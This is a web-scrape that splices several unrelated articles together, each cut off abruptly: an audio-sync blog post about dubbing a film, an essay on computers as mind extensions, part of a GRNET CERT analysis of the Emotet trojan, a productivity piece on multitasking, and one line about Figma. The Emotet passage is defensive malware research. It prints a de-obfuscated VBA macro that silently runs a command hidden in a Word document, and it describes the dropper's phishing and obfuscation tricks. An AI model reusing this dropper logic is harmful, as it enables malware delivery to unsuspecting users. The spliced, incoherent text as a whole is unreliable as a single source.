<!--kg-card-end: markdown--><h2 id="new-plan-choirless-to-the-rescue-">New Plan - Choirless to the Rescue!</h2><p>Re-winding back to 2020, some colleagues of mine in IBM had a fantastic idea for our Internal Call for Code competition. <a href="https://www.choirless.com/">Choirless</a> is an online web service that allows distanced choir and band members to record their performances separately and to have them automatically synchronised and merged into a fantastic performance video. The summary of Choirless is well worth a watch:</p><figure></figure><p>It struck me that the work Choirless does to synchronise all of the performers could potentially be the magic bullet for solving this, <a href="https://twitter.com/HammerToe">@HammerToe</a> had written some clever python that could take two audio streams and synchronise them and even had streamed a walkthrough of his code that I had managed to catch months ago by chance:</p><figure></figure><p>Anything that I could explain here about my process would just be a re-hashing of the above video, so I highly recommend that you check it out. But the key point is this: Whilst both the Japanese and Cantonese audio tracks will be different because of the language differences, there is still plenty of audio that should be (almost) <em><strong>identical. </strong></em>All of the music and sound effects should be the same across both versions, so that will give us exactly what we need to identify the correct starting points for the Cantonese dub.</p><h2 id="how-it-works">How it works</h2><figure><img src="https://jsutton.co.uk/content/images/2021/02/diagram.png" alt=""><figcaption>Diagram showing the synchronisation process&nbsp;</figcaption></figure><p>The process starts off with extracting the video &amp; audio from the Blu Ray and VCDs onto your computer, I used <a href="https://handbrake.fr/">handbrake</a> for this.</p><p>Then you process the HQ Video (Primary) and the first VCD Video (Secondary). The python script will use the onset strength to look for peaks in both audio streams, it will then do forward and back passes with different offsets to find the best match for where the onset strength matches up.</p><figure><img src="https://jsutton.co.uk/content/images/2021/02/Screenshot-2021-01-31-at-11.05.59.png" alt="" srcset="https://jsutton.co.uk/content/images/size/w600/2021/02/Screenshot-2021-01-31-at-11.05.59.png 600w, https://jsutton.co.uk/content/images/size/w1000/2021/02/Screenshot-2021-01-31-at-11.05.59.png 1000w, https://jsutton.co.uk/content/images/size/w1600/2021/02/Screenshot-2021-01-31-at-11.05.59.png 1600w, https://jsutton.co.uk/content/images/2021/02/Screenshot-2021-01-31-at-11.05.59.png 2354w" sizes="(min-width: 720px) 720px"><figcaption>Two charts showing the onset strength peaks before and after synchronisation.</figcaption></figure><p>Now because the VCD was split in two, we need to work out at which point the audio "should" start, so that we can skip forward on the primary track to the right place to give us our best chance of finding the offset. This is basically the following formula:</p><!--kg-card-begin: markdown--><p><code>hq_offset = part_1_duration - part_1_offset</code></p>
<!--kg-card-end: markdown--><p>Once we've got that, we repeat the synchronisation process for the second half of the audio! Sometimes the difference is positive rather than negative, this means that there is sadly a gap in the middle, so we need to add a slight delay in the middle before carrying on, so keep that in mind when you're doing this yourself.</p><!--kg-card-begin: markdown--><p>At this point, we should have the following:</p>
<ul>
<li>HQ rip of the Blu Ray</li>
<li>LQ Rip Parts 1 and 2 of the VCD</li>
<li>The offset in milliseconds for both parts of the VCD audio.</li>

is that we’re tool builders. I read a study that measured the efficiency of
locomotion for various species on the planet. The condor used the least
energy to move a kilometer. Humans came in with a rather unimpressive
showing about a third of the way down the list. It was not too proud a
showing for the crown of creation. So, that didn’t look so good.</p><p>But then, somebody at Scientific American had the insight to test the
efficiency of locomotion for a man on a bicycle. And, a man on a bicycle, a
human on a bicycle, blew the condor away, completely off the top of the
charts.</p><p>And that’s what a computer is to me. What a computer is to me is it’s the
most remarkable tool that we’ve ever come up with.</p><p>It’s the equivalent of a bicycle for our minds.</p><p>— <a href="https://www.youtube.com/watch?v=0lvMgMrNDlg&amp;feature=youtu.be&amp;t=322">Steve Jobs (1980)</a></p></blockquote><p>* * *</p><p><a href="https://www.it-hiroshima.ac.jp/institution/library/pdf/research52%5F007-013.pdf">No one knows</a> when or how we, the human species, started talking to each
other. It is likely a natural progression from gesturing, but we can only
speculate about it.</p><p>Language allowed us to break out of our brains and reveal the inner
workings of our consciousness to others.</p><figure><img src="https://www.murilopereira.com/language_speech.jpg" alt="Figure 2: Scott H. Young"><figcaption><p>Figure 2: <a href="https://www.scotthyoung.com/blog/2018/12/04/25-thinking-tools/">Scott H. Young</a></p></figcaption></figure><p>Language is the vessel that carried us from the stone age through the
agricultural revolution, the development of written language, the
scientific and industrial revolutions, and now, the digital age.</p><p>Writing allowed us to <em>offload</em> memories to the physical world—outside of
our brains. Through our collective and external memories, each generation
has a head start on the previous one. Little by little, standing on the
shoulders of taller and taller giants, we accumulate knowledge about
ourselves and everything around us.</p><p>We’ve been for long using tools to help us think: notebooks help us
calculate formulas, reason geometrically and preserve our ideas. With
computers, our <em>thinking</em> is now occurring outside of our brains.</p><p>Computers are extensions of our minds in that they allow us to store,
process, and retrieve information from them. With the advent of the
internet we now have immediate access to not only almost all of the
information ever produced by humankind but also to reproducible <em>thinking</em>
encoded into these machines: algorithms.</p><p>Our brain is still a much more impressive device than any of today's
computers. Computers learn
<a href="https://www.davidsilver.uk/wp-content/uploads/2020/03/nfsp-1.pdf">mostly</a>
by finding patterns in massive
quantities of examples given by us. Teaching a young kid about cars—how
to recognize one, what they are, what their purpose is, and how they're
related to other things—requires little supervision. Noam Chomsky talks
about it in
<a href="https://www.youtube.com/watch?v=hdUbIlwHRkY&amp;t=1462">this interview</a>.</p><p>Each of these processes—storing, processing and retrieving
information—have concrete effects on the physical world: if I’m in
Munich, saying “show route to Hamburg” to my phone will immediately show me
the distance, ETAs and paths for different types of transport to reach my
destination. Not only do I now suddenly know how to navigate across the
country to reach another city, I’m also able to follow through the exact
path via GPS—a sixth sense giving me perfect geolocation!</p><p>These <em>things</em> that we created—computers, and the internet—are literally
<a href="https://www.ncbi.nlm.nih.gov/pmc/articles/PMC6502424/">rewiring our brains</a>, right now, shaping how we think, and engage in social
relationships, changing not only our individual selves but the societies we
live in.</p><p>They started as mechanical machines that filled entire laboratories, turned
into beige boxes in our homes and places of work, and are now sleek slabs
of plastic, metal and glass in everyone’s pockets. Step by step they get
closer to our bodies, their interfaces more intuitive and natural.</p><p>The way we communicate with them is changing: before, we could only
interact with them by speaking their language. We have now taught them
ours. The torch of progress blazes on: it’s a matter of <em>time</em> until they’re
connected directly with our brains—which is equally terrifying and
awe-inspiring.</p><figure><img src="https://www.murilopereira.com/neuralink.jpg" alt="Figure 3: Neuralink"><figcaption><p>Figure 3: <a href="https://neuralink.com/">Neuralink</a></p></figcaption></figure><p>Brain-computer interfaces present a monumental scientific and engineering
challenge, and brain-to-brain, a whole other category of difficulty.</p><p>First, we have no idea how information is encoded in the brain. That needs
to be understood. Second, even assuming we’re able to take a perfect
snapshot of a piece of information in someone’s brain—for example, how a
particular movie scene makes them feel—we still need to be able to encode
it in a way that includes the full context of their subjective experiences.
Maybe the scene evokes unique memories of their childhood or is somehow
entangled with the smell of a particular cinema’s leather seats. Third, we
need to figure out how to safely write this perfect snapshot into someone
else’s brain in a way that can be perceived identically.</p><p>Which is to say, it’s a difficult problem. But a worthwhile one: imagine
having the capability to suddenly become aware of answers for questions you
just thought about. To expertly control <a href="https://youtu.be/PLk8Pm%5FXBJE?t=13">truly integrated</a> prosthetics giving
you superhuman abilities. To give movement to the paralized, sound to the
deaf, and sight to the blind.</p><p>What would be the impacts on society if we were able to communicate an
order of magnitude more effectively? What if <em>everyone</em> was equipped with
the same undisputed basic knowledge of history and science?</p><p>There are internal thoughts that we can attempt to describe with a thousand
words, but ultimately fail to capture in a way that’s precise, much less
comprehensible by someone else. Words and sentences are an incomplete
representation of our internal thoughts. In the same way that 3D objects
cast 2D shadows (<a href="https://www.youtube.com/watch?v=N0WjV6MmCyM">and 4D, 3D</a>) communicating through language doesn’t carry
all of our cultural and developmental context—transmitting all of that
along with every phrase would be impractical. Language is in this sense,
lossily compressed thought.</p><figure><img src="https://www.murilopereira.com/tesseract_shadow.jpg"></figure><p>Inert strings of words of ink and paper take a life of their own inside our
heads. It’s why the exact same information can be interpreted completely
differently by different people.</p><p>Before language, fire and cooking technology allowed us to reallocate
energy usage from the digestive system to the brain by outsourcing
digestion to outside of our bodies, making macronutrients more efficiently
absorbable. Almost all of a cooked meal is metabolized by the body, whereas
raw foods yield less than half of their nutrients.</p><p>Cooking is an extension of our digestive system, and enabled us to develop
large, calorie-hungry brains. It also gave us time to think: our primate
cousins spend half of their days chewing raw food to consume enough
calories to stay alive.</p><p>Brains can be seen as <em>survival machines</em>, locked inside dark skulls,
constantly building a model of the outside world by predicting and learning
through senses and memory. The biological human brain evolved to have the
necessary sophistication to not only expertly navigate and understand the
brute physical reality but also to construct <em>social</em> reality. Democracy,
religion, money: all made up by us, for us.</p><p>We remember the past so that we can predict the future, and by doing so, we
thrive.</p><p>We create technology, which functions as a non-biological extra layer to
our brains and bodies, augmenting, complementing, and sometimes replacing
our natural capabilities.</p><blockquote><p>The wheel… is an extension of the foot.</p><p>The book… is an extension of the eye…</p><p>Clothing, an extension of the skin…</p><p>Electric circuitry, an extension of the central nervous system.</p><p>—
<a href="https://en.wikipedia.org/wiki/Understanding_Media">Understanding Media: The Extensions of Man (1964)</a></p></blockquote><p>Relatively speaking, we are done evolving <em>biologically</em>. Further adaptations
and enhancements to our bodies and minds will come through technology.</p><figure><img src="https://www.murilopereira.com/brain_layers.jpg" alt="Figure 5: Check out &amp;ldquo;Neuralink and the Brain&amp;rsquo;s Magical Future&amp;rdquo; for a very entertaining primer on the brain."><figcaption><p>Figure 5: Check out “<a href="https://waitbutwhy.com/2017/04/neuralink.html">Neuralink and the Brain’s Magical Future</a>” for a very entertaining primer on the brain.</p></figcaption></figure><p>To be human is to have the ability to change the world around us. The shift
from hunting and gathering to farming allowed us to spend less energy to
acquire food while giving us a predictable calorie supply.</p><p>The resulting food surplus made it possible for populations to settle down
and grow quickly while supporting people not being directly involved in the
production of food—before agriculture that was everyone’s job. For one,
it allowed some to specialize and focus on developing better farming tools
and more resistant crops, starting a vicious cycle of improvement and
consumption that continues until today.</p><p>The transition from active foraging to a more sedentary lifestyle resulted
in worse health for the general population. The average farmer worked
harder than the average forager and got a worse diet in return. Our teeth,
bones and joints became more fragile, and we became afflicted by novel
diseases coming from newly domesticated animals, carriers of pathogens that
incubated in our new densely populated cities.</p><p>Owning land suddenly became really important. Agriculture and the concept
of private property reinforced each other and grew together, allowing us to
create value and secure the fruits of our labor. It also created the
circumstances for slavery to arise, and wars to be waged.</p><p>The groups of people growing the first crops could not have anticipated all
of the collateral effects of their breakthrough. They just wanted more
food.</p><p>If the past has taught us anything is that we have to be mindful of the
consequences of our progress. In an increasingly connected world, change is
often <a href="https://hbr.org/2017/05/linear-thinking-in-a-nonlinear-world">nonlinear</a> and unpredictable. Cars didn’t just replace horses—they
forever changed the entire outlook of every city. Did Tim Berners-Lee
anticipate his invention adding to forces pulling whole countries apart?</p><p>Our progress will continue to bring us previously unimaginable challenges.
Against an unknowable future, it doesn’t hurt to keep improving our
capabilities to adapt and, more difficultly, to cooperate—especially at
scale.</p><figure><img src="https://www.murilopereira.com/humanity.jpg" alt="Figure 6: &amp;ldquo;Humanity&amp;rdquo; by Pawel Kuczynski"><figcaption><p>Figure 6: “<a href="https://www.pictorem.com/24592/humanity.html">Humanity</a>” by Pawel Kuczynski</p></figcaption></figure><p>Computers are getting pretty good at driving cars—even in the most

<h2><span id="Preamble"></span>Preamble<span></span></h2>



<p>In October 2020 we observed an outbreak of malicious e-mails reaching GRNET employees’ inboxes. Meanwhile, similar campaigns were also targeting several public and private sector organizations in Greece. After acquiring dozens of such e-mails, we started planning our defensive strategy. To do so, we started analyzing the malware that was attached to the emails and realized that were dealing with the infamous Emotet trojan.</p>



<p>In this document, we describe the steps of our analysis including the reverse engineering process of the malware executables, how we overcame the binary obfuscation techniques it employed, and how we determined the malware’s internals. In the course of our work, we were able to discover the list of IP addresses that&nbsp;constituted the network of Command-and-Control (C2) servers of Emotet. This information was very useful because we utilized it to detect any network connections from the GRNET network to the Emotet C2 network. Such connections&nbsp; would indicate a potential compromised workstation in our premises. Overall, the goals of our analysis were to (a) create an infrastructure that received new updates of the Emotet trojan and keep our list of C2 IP addresses up-to-date and (b) understand the trojan’s persistence mechanism to perform forensic invastigations on compromised workstations.</p>



<p>On January 27, 2021 <a rel="noreferrer noopener" href="https://www.europol.europa.eu/newsroom/news/world%E2%80%99s-most-dangerous-malware-emotet-disrupted-through-global-action" target="_blank">Europol announced</a> that it had completely taken down Emotet. The same day our update-monitoring infrastructure received an update which was Europol’s clean-up payload scheduled to be executed on April 25, 2021 at 12:00 p.m.. Hopefully, this will be the last time that we hear about Emotet. Meanwhile, we had been working on analyzing Emotet up to the time of Europol’s announcement. We release our analysis results hoping that IT professionals will find them useful when trying to protect against similar trojans in the future.</p>



<p>In <a href="https://cert.grnet.gr/en/blog/reverse-engineering-emotet/#Chapter_1_From_the_e-mails_to_the_binaries" data-type="post">Chapter 1</a> we describe the malicious e-mails and the malware dropper (a macro-enabled MS Word document) delivered via those e-mails.&nbsp;If you are already familiar with Emotet’s dropper you may directly skip to the next chapters. In <a href="https://cert.grnet.gr/en/blog/reverse-engineering-emotet/#Chapter_2_From_the_Protector_to_the_Trojan">Chapter 2</a> we analyze the malware’s multi-layer Protector responsible for unpacking, decrypting and running the trojan for the first time. In <a href="https://cert.grnet.gr/en/blog/reverse-engineering-emotet/#Chapter_3_Overcoming_the_malware_obfuscation_techniques">Chapter 3</a> we describe the binary obfuscation techniques incorporated in the trojan itself as well as the ways to bypass them. In <a href="https://cert.grnet.gr/en/blog/reverse-engineering-emotet/#Chapter_4_The_trojans_internals">Chapter 4</a> we provide an in-depth description of the trojan’s inner-workings, its persistence mechanism, the communication with the Command-and-Control servers network and the way we discovered the C2 network. Finally, in <a href="https://cert.grnet.gr/en/blog/reverse-engineering-emotet/#Chapter_5_Monitoring_the_updates">Chapter 5</a> we briefly describe the process we followed to retrieve and analyze new payloads served by the C2 network.</p>



<p>We have published the de-compiled code of referenced functions as well as the utilities that we implemented during the analysis in <a href="https://github.com/grnet/emotet-utils" target="_blank" rel="noreferrer noopener">a GitHub repository</a>.</p>



<p>This work was carried out under the&nbsp;supervision of GRNET’s Chief Information Security Officer, Dimitris Mitropoulos.</p>

<h2><span id="Chapter_1_From_the_e-mails_to_the_binaries"></span>Chapter 1. From the e-mails to the binaries<span></span></h2>



<h3><span id="Introduction"></span>Introduction<span></span></h3>



<p>October 2020.</p>



<p>Seven months have passed since the first COVID-19 lockdown in Greece. The pandemic finds GRNET with a largely broadened IT Security agenda heavily linked with the state’s current digital transformation (involving several new applications being developed and maintained in house). The aforementioned developments, together with the work-from-home style that has just arrived, completely redefined the security perimeter and priorities of GRNET CERT. A new era comes with new challenges.</p>



<p>Somewhere in between the various ongoing tasks, a number of weird looking e-mails that reached GRNET employees came to our notice. They all had a similar form, i.e., replies to legitimate mails that either contain a URL or an encrypted ZIP attachment and its password.</p>



<h3><span id="The_e-mails"></span>The e-mails<span></span></h3>



<p>First, to raise awareness, we notified all GRNET employees. Then, we started collecting and analyzing the suspicious e-mails. Initially, we inspected their source code looking for similarities.</p>



<figure><ul><li><figure><a href="https://cert.grnet.gr/wp-content/uploads/2021/02/emotet-dropper-email-1.png" rel="prettyPhoto[gallery-8SOY]"><img loading="lazy" width="685" height="750" src="https://cert.grnet.gr/wp-content/uploads/2021/02/emotet-dropper-email-1.png" alt="E-mails delivering Emotet dropper via URL (left) and attachment (right)" data-id="850" data-full-url="https://cert.grnet.gr/wp-content/uploads/2021/02/emotet-dropper-email-1.png" data-link="https://cert.grnet.gr/en/emotet-dropper-email-1/" srcset="https://cert.grnet.gr/wp-content/uploads/2021/02/emotet-dropper-email-1.png 685w, https://cert.grnet.gr/wp-content/uploads/2021/02/emotet-dropper-email-1-274x300.png 274w" sizes="(max-width: 685px) 100vw, 685px"></a></figure></li><li><figure><a href="https://cert.grnet.gr/wp-content/uploads/2021/02/emotet-dropper-email-2.png" rel="prettyPhoto[gallery-8SOY]"><img loading="lazy" width="960" height="853" src="https://cert.grnet.gr/wp-content/uploads/2021/02/emotet-dropper-email-2.png" alt="E-mails delivering Emotet dropper via URL (left) and attachment (right)" data-id="677" data-full-url="https://cert.grnet.gr/wp-content/uploads/2021/02/emotet-dropper-email-2.png" data-link="https://cert.grnet.gr/en/emotet-dropper-email-2-2/" srcset="https://cert.grnet.gr/wp-content/uploads/2021/02/emotet-dropper-email-2.png 960w, https://cert.grnet.gr/wp-content/uploads/2021/02/emotet-dropper-email-2-300x267.png 300w, https://cert.grnet.gr/wp-content/uploads/2021/02/emotet-dropper-email-2-768x682.png 768w" sizes="(max-width: 960px) 100vw, 960px"></a></figure></li></ul><figcaption>Figure 1. E-mails delivering Emotet dropper via URL (left) and attachment (right)</figcaption></figure>



<p>Our analysis led to several interesting remarks:</p>



<ul><li>All e-mails were replies to legitimate e-mails. The e-mail subject followed a specific pattern, i.e., “Re: &lt;ORIGINAL MAIL SUBJECT&gt;”. Also, the e-mail body contained the quoted original e-mail body.</li><li>The sender’s display name was altered to be the same with that of the original e-mail.</li><li>However, the sender’s e-mail address was some unrelated e-mail address (several compromised e-mail accounts were used).</li><li>The body of the reply contained either a URL or an attachment.<ul><li>In the case of the URL, the text contained a legitimate domain name (e.g. gmail.com). Nevertheless, the actual target was completely different. Our investigation indicated that they were compromised websites used by the attackers to host the malicious documents.</li><li>In the case of the attachment we observed encrypted ZIP files with the corresponding password contained in the reply body. Note that password encrypted attachments are commonly used to bypass any malware detection running on e-mail servers.</li></ul></li><li>Finally, in all cases we ended up with MS Word documents.</li></ul>



<h3><span id="The_MS_Word_documents"></span>The MS Word documents<span></span></h3>



<p>Up to this point, we had already been informed about similar cases affecting other public and private sector organizations in Greece. Thus, a conventional incident response was not enough; we wanted to further analyze the malware.</p>



<p>Our analysis started with the Word documents. When opening one of the documents, the victim sees a fake pop-up window. In fact, this is just an image inside the document imitating a legitimate pop-up window. In each document the fake pop-up window phrasing was different, but in every case it was there to persuade the victim to enable the Macro execution.</p>

<p>We will continue by analyzing one of the MS Word documents. All other documents were similar to the one examined; albeit with minor differences.</p>



<h3><span id="The_VBScript_Macros"></span>The VBScript Macros<span></span></h3>



<p>To see what would happen when a user enabled the macros, we examined the corresponding VBScript. The entry-point <code>Document.Open()</code> called function <code>Q4hxwcihtett()</code> of module <code>Iauesnh6lzhaf</code>:</p>



<div><figure><a href="https://cert.grnet.gr/wp-content/uploads/2021/02/emotet-dropper-vbscript-1.png" rel="prettyPhoto[gallery-8SOY]"><img loading="lazy" width="395" height="163" src="https://cert.grnet.gr/wp-content/uploads/2021/02/emotet-dropper-vbscript-1.png" alt="" srcset="https://cert.grnet.gr/wp-content/uploads/2021/02/emotet-dropper-vbscript-1.png 395w, https://cert.grnet.gr/wp-content/uploads/2021/02/emotet-dropper-vbscript-1-300x124.png 300w" sizes="(max-width: 395px) 100vw, 395px"></a><figcaption>Figure 3. The VBScript macro entry-point </figcaption></figure></div>



<p>The function code, as we observe below, was obfuscated:</p>



<div><figure><a href="https://cert.grnet.gr/wp-content/uploads/2021/02/emotet-dropper-vbscript-2-edited.png" rel="prettyPhoto[gallery-8SOY]"><img loading="lazy" width="735" height="413" src="https://cert.grnet.gr/wp-content/uploads/2021/02/emotet-dropper-vbscript-2-edited-1.png" alt="" srcset="https://cert.grnet.gr/wp-content/uploads/2021/02/emotet-dropper-vbscript-2-edited-1.png 735w, https://cert.grnet.gr/wp-content/uploads/2021/02/emotet-dropper-vbscript-2-edited-1-300x169.png 300w" sizes="(max-width: 735px) 100vw, 735px"></a><figcaption>Figure 4. The main VBSript macro module</figcaption></figure></div>



<p>We started following the code flow manually to understand it. This manual process revealed that most of the code was indeed irrelevant. Specifically, for each meaningful code instruction, the obfuscation process had generated a bunch of meaningless instructions placed before the meaningful one. So, most of the de-obfuscation effort was to identify each block and isolate the meaningful code instruction out of the block.</p>



<p>Luckily enough, the attackers had left some traces that were helpful for us. As we noticed, their obfuscating tool had a serious issue (nobody’s perfect). In particular, it did not apply the indentation of the original instruction on the instructions of the replacement block. As a result, the original indentation could be found on the first instruction of each block. This&nbsp;issue gave us a way to automatically detect the blocks and isolate the last instruction of each block, which we knew it was the meaningful instruction of the block.</p>



<p>The following obfuscation techniques were identified:</p>



<ul><li>Deliberate run-time errors in junk instructions (which were ignored because of the <code>On Error Resume Next</code> statement),</li><li>String construction using one or more of the following:<ul><li>String concatenation,</li><li>Use of undefined variables that resolve to empty strings,</li><li>String replacements with the <code>Replace()</code> function,</li><li>Conversion of ASCII codes to strings with the <code>ChrW()</code> function,</li><li>Retrieval of values from hidden user form control elements,</li></ul></li><li>Alteration between upper and lower case letters in symbol names, exploiting the case insensitivity of Windows OS,</li><li>Use of the line-continuation character <code>_</code> to break statements in multiple lines.</li></ul>



<p>Then, we only had to manually de-obfuscate some lines of code (the original number of lines was a little more than 400). The result was the following:</p>



<pre><code>01: Rem Attribute VBA_ModuleType=VBADocumentModule
02: Option VBASupport 1
03: Private Sub Document_open()
04:   Set storyRange = ThisDocument.StoryRanges.Item(1)
05:   Set commandLine = Mid(storyRange, 5, Len(storyRange))
06:   commandLine = Replace(commandLine, "][ 1) jjkgS [] []w", Empty)
07:   Set objProcess = CreateObject("winmgmts:Win32_Process")
08:   Set objProcessStartup = CreateObject("winmgmts:Win32_ProcessStartup")
09:   objProcessStartup.ShowWindow = 0
10:   objProcess.Create commandLine, Empty, objProcessStartup
11: End Sub</code></pre>



<p>Hence, we were able to answer an important question: “What happens when the user executes this macro?”</p>



<p>Well, it spawns a process calling the <code>Win32_Process.Create()</code> method (line 10). The startup information parameter says “do not show a window” (line 9). Further, the command line parameter holds the command that will be invoked by the spawned process. As we can observe in the code, the command is already in the document (lines 4-5) together with some junk that is removed (line 6).</p>



<p>So there was something more in the document itself apart from the fake popup window.</p>



<h3><span id="The_PowerShell_script"></span>The PowerShell script<span></span></h3>



<p>First, we removed the formatting. In this way we revealed a paragraph that was kept out of the victim’s sight (it was formatted with a font size of 2px and a white font color):</p>



<div><figure><a href="https://cert.grnet.gr/wp-content/uploads/2021/02/emotet-dropper-powershell-1-edited.png" rel="prettyPhoto[gallery-8SOY]"><img loading="lazy" width="1280" height="720" src="https://cert.grnet.gr/wp-content/uploads/2021/02/emotet-dropper-powershell-1-edited-1.png" alt="" srcset="https://cert.grnet.gr/wp-content/uploads/2021/02/emotet-dropper-powershell-1-edited-1.png 1280w, https://cert.grnet.gr/wp-content/uploads/2021/02/emotet-dropper-powershell-1-edited-1-300x169.png 300w, https://cert.grnet.gr/wp-content/uploads/2021/02/emotet-dropper-powershell-1-edited-1-1024x576.png 1024w, https://cert.grnet.gr/wp-content/uploads/2021/02/emotet-dropper-powershell-1-edited-1-768x432.png 768w" sizes="(max-width: 1280px) 100vw, 1280px"></a><figcaption>Figure 5. Obfuscated PowerShell command hidden in document body</figcaption></figure></div>



<p>This looked obfuscated, too. But we already know how to de-obfuscate it, i.e.  <code>Replace(commandLine, "][ 1) jjkgS [] []w", Empty)</code>:</p>

                    <p>I know you don’t want to hear it. But multitasking isn’t effective. In this day and age of extreme busyness and “how much can we get done in a day” mentality, everyone is trying to do more — all at once. </p><!--kg-card-begin: markdown--><blockquote>
<p><span>"We claim to be multitasking, but in reality, we are just tackling several tasks in a far less effective way than we would if we simply focused on one at a time."</span></p>
</blockquote>
<!--kg-card-end: markdown--><p>We seem to think that <em>doing more</em> gives us more value as human beings. That somehow the <em>doing</em> gives us meaning and purpose (as opposed to what is actually accomplished). And we have trouble distinguishing between what is truly important and what is not. Or perhaps the problem comes in making the <em>choice</em> of what is important — in other words: choosing the priority.</p><figure><img src="https://blog.doit.io/content/images/2020/06/MythOfMultitasking-1.jpg" alt="The myth of multitasking"><figcaption>The myth of multitasking</figcaption></figure><p>Notice I said <em>priority</em>, singular. In essence, the definition of the word <em>priority </em>means <em>something of highest importance that comes before other things</em>. When you truly think about it, it is impossible to have more than one. If you claim to have, for instance, ten priorities, then there is really no priority. They all become of equal importance and none of them is coming before the other. </p><!--kg-card-begin: markdown--><blockquote>
<p><span>"When we try to multitask, we are basically refusing to choose a priority in that moment."</span></p>
</blockquote>
<!--kg-card-end: markdown--><p>We are forcing our brain to battle it out, and unfortunately, it is a losing battle.</p><h2 id="the-brain-s-reality">The Brain’s Reality</h2><p>So is it really totally impossible to multitask? After all, people claim to be doing it all the time. In fact, many of us pride ourselves on it. We look at younger generations — those growing up immersed in technology — as being experts in multitasking. </p><p>Well, it’s possible to do some simple tasks at the same time — like walking and talking. But when it comes to concentrated work, multitasking just isn’t scientifically possible. Instead, when we try to do two types of work at the same time that require our concentration, our brain switches back and forth from task to task. </p><p>Okay, so maybe we switch back and forth. But we’re still getting both things done right? Possibly. But the cost is often not worth it. Your brain is working much harder than it needs to. In fact, it’s overwhelmed with the constant switching of information. </p><h2 id="the-cost-of-the-switch">The Cost of the Switch</h2><p>Each time your brain switches from focus on one thing to focus on another, it takes time to recalibrate. Imagine it as refocusing a camera lens on two different subjects, back and forth. It takes a few seconds to change the focus each time, and those seconds add up. And when the tasks are really high-information tasks, like coding, for instance, it takes even longer to get back to full focus.</p><p>So you actually <strong>lose valuable time</strong> when you attempt to multitask. Not only that but your attention is divided. The switch puts you in an attention debt that takes a toll on your mental state. You are more likely to make mistakes and produce lower-quality work than <a href="https://blog.doit.io/focus-on-one-thing-leads-to-better-work/">if you were to simply do one thing at a time.</a> </p><h2 id="the-challenge-of-focus">The Challenge of Focus</h2><p>Despite the facts laid out in front of us, we continue to attempt multitasking. We churn out the work and check off the boxes like we are competing for a prize at the end of the day. And our lives are set up to encourage this. </p><p>Our smartphones are mini-computers that we carry with us everywhere. Sure, they are very convenient, but they are also constant distractions pulling at our attention. Many of us also compulsively check our email and text messages. The pace of communication today is such that we feel like we can’t afford not to. Some workplaces are set up in such a way that we are <em>expected</em> to respond immediately to any messages sent. Unfortunately, this takes a toll on our focus, too.</p><h2 id="narrowing-down-your-priorities">Narrowing Down Your Priorities</h2><p>Streamlining your priorities is a choice. And it may well be a tough one. But if you want to produce higher-quality work and reduce the stress on your brain, it’s worth it. Perhaps it’s too much to expect you to choose one single priority. But it starts with narrowing down your total priorities. And then simply choosing ONE priority for a specific chunk of time. One single thing to focus on.</p><p>So, take a step back and zoom out to the bigger picture of your life or your job. What is <em>truly</em> important to you or to your role? You may want to have a ranking system so you place areas of life or goals in order of importance. When you put some thought into it and make these choices “ahead of time,” it allows you to stay true to your priorities in the heat of the moment. When something comes up in your day and you have to choose what gets your full attention, you have already decided on your priorities.</p><h2 id="weed-out-the-multitasking">Weed Out the Multitasking</h2><p>Start eliminating the multitasking moments and improving your focus and work quality by choosing one time-slot per day where you will focus on one single task. Just start with one. Don’t make it too big — 30-45 minutes is enough to start. (Your brain needs breaks, too.) As you discover the value in doing this, you’ll likely want to add more chunks of focused time.</p><p>As you work on weeding out the multitasking, think of consolidating other things you do during a given day. Because another thing that weakens our focus is role-switching. So when we switch from making phone calls (which is one type of skill) to writing a brief (which is another skill) to filling out a form (which is another), it also tires our brains unnecessarily. Instead, look at how you can group similar types of tasks together. </p><p>This means email, too.</p><!--kg-card-begin: markdown--><blockquote>
<p><span>"Instead of keeping your browser open all day and responding as they come in, give yourself set times to handle email."</span></p>
</blockquote>
<!--kg-card-end: markdown--><p>If that makes you nervous (<em>“What if I don’t respond to someone right away?!”</em>), then perhaps include in your email signature a line that says, “I check email at 10 a.m., 1 p.m., and 4 p.m.” This gives them an indication of when they can expect a response. Checking email constantly might be a tough habit to break, but remember it <em>is</em> a habit that we’ve built up. Don’t forget there was a time when there was no email and no smartphones. And everyone survived.</p><p>We have incorporated distractions into our lives, and they are disguised as a means to be “connected” and “more productive.” Be aware of what is truly helping you be productive and what is actually keeping you from the goals you really care about.</p><h2 id="systems-to-try">Systems to Try</h2><p>Choosing priorities and improving focus have been issues for many people for a very long time. So know you are not alone in the struggle. Luckily, those before you have also created systems and processes to help simplify things. </p><p>If you are in the market for a more structured approach to deciding on priorities and focusing, perhaps try David Allen’s <a href="https://blog.doit.io/getting-things-done-gtd-method/"><em>Getting Things Done</em></a> system to give you some fresh clarity. Or try the <a href="https://blog.doit.io/the-pomodoro-technique-boost-your-productivity/"><em>Pomodoro technique</em></a> to give you a framework for focused work. The <a href="https://blog.doit.io/the-ivy-lee-method/"><em>Ivy Lee Method</em></a> helps you to minimize your daily priorities, and the <a href="https://blog.doit.io/the-eisenhower-matrix/"><em>Eisenhower Matrix</em></a> helps you determine what is truly important vs. urgent.</p><p>There are many systems and processes to choose from, all with slightly different approaches for improving your productivity. None are right or wrong — it’s all about what will work for you. I suggest you choose one to try and give it a few weeks to see whether it helps you or not. Ultimately, the change will need to come from within you and your own desire to produce higher quality work with less stress. And remember that the way we work is habit, and we have the power to transform our habits for the better. But it doesn’t happen overnight. So matter how you choose to approach it, remember to give it time and stay committed.</p><h2 id="the-benefits-of-single-tasking-and-fewer-priorities">The Benefits of Single-Tasking and Fewer Priorities</h2><p>There is a state that is possible to reach <em>only</em> when your focus is pure and your attention is on a single task. That is the state of <strong>Flow</strong> (discussed in detail by Mihaly Csikszentmihalyi in his book of the same name). Creative thinking is at a maximum and you are completely <em>in the zone</em>. The quality of work is usually very high. And not only that, but the feeling you get when you are able to work in this state is truly wonderful. </p><p>Accomplishment. Pride. Fulfillment. </p><p>Fewer priorities means you can give your <strong>all</strong> to your goals. It means you waste less time and undoubtedly feel more energetic. It equals lower levels of stress and reduced anxiety. With the facts laid out before you, it seems ridiculous to keep attempting the false process which is multitasking! Give single-tasking a try and experience the wealth of benefits to your workflow and quality.</p><p><a href="https://blog.doit.io/what-is-productivity/">&lt;- Go back to The Productivity Guide</a><br></p>

<p><strong>How Figma and Canva are taking on Adobe—and winning</strong></p>



<p>In 2010, Photoshop was ubiquitous. Whether you were editing a photo, making a poster, or designing a website, it happened in Photoshop.&nbsp;</p>



